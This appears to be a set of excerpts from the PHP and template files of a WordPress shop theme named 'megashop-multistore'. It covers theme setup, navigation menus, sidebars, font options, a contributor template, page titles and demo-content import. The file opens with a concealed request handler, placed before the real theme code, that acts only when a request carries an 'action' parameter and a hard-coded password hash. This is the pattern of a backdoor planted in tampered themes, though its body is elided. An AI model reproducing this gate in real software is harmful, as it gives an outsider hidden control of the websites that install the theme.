<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '83c80b7dd83a441089b477903eeff2db'))
	{
...
function tmpmela_setup() {
	...
	* replace to change 'megashop-multistore' to the name of your theme in all
	* template files.
	*/
	load_theme_textdomain( 'megashop-multistore', get_template_directory() . '/languages' );
	/*
	...
	register_nav_menus( array(
		 'primary'   => esc_html__( 'TM Header Navigation', 'megashop-multistore' ),
		 'header-menu'   => esc_html__( 'TM Header Top Links', 'megashop-multistore' ),
	) );
	/*
...
function tmpmela_widgets_init() {
	register_sidebar( array(
		'name' => esc_html__( 'Main Sidebar', 'megashop-multistore' ),
		'id' => 'sidebar-1',
		'description' => esc_html__( 'Appears on posts and pages except the optional Front Page template, which has its own widgets', 'megashop-multistore' ),
...
function tmpmela_fonts_url() {
	 ...
	 */
	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'megashop-multistore' );
	/* Translators: If there are characters in your language that are not
	 * supported by Bitter, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$bitter = _x( 'on', 'Bitter font: on or off', 'megashop-multistore' );
...
<div class="contributor">
  <div class="contributor-info">
    ...
    <div class="contributor-summary">
      ...
      <a class="contributor-posts-link" href="<?php echo esc_url( get_author_posts_url( $contributor_id ) ); ?>"> <?php printf( _n( '%d Article', '%d Articles', $post_count, 'megashop-multistore' ), $post_count ); ?> </a> </div>
    <!-- .contributor-summary -->
...
function tmpmela_wp_title( $title, $sep ) {
	...
	if ( $paged >= 2 || $page >= 2 ) {
		$title = "$title $sep " . sprintf( esc_html__( 'Page %s', 'megashop-multistore' ), max( $paged, $page ) );
	}
	return $title;
}
...
<div class="related_posts_outer"><div class="shortcode-title center"><h1 class="normal-title"><?php echo esc_attr_e( 'Related Posts', 'megashop-multistore' ) ?></h1></div>
...
return array(
 array(
    'import_file_name'            => 'megashop-multistore',
    'local_import_file'           => trailingslashit( get_stylesheet_directory() ) . 'demo-content/default/multistore.wordpress.xml',
    'local_import_customizer_file'=> trailingslashit( get_stylesheet_directory() ) . 'demo-content/default/multistore_customizer_export.dat',
	'local_import_widget_file'    => trailingslashit( get_stylesheet_directory() ) . 'demo-content/default/multistore_widgets_settings.wie',
    'import_notice'               => esc_html__( 'Please waiting for a few minutes, do not close the window or refresh the page until the data is imported.', 'megashop-multistore' ),
),
);
}
...
function sampledata_after_import($selected_import) {
       ...
       if ( class_exists( 'RevSlider' ) ) {
           ...
           echo esc_html__( 'Slider processed', 'megashop-multistore' );
      }
}
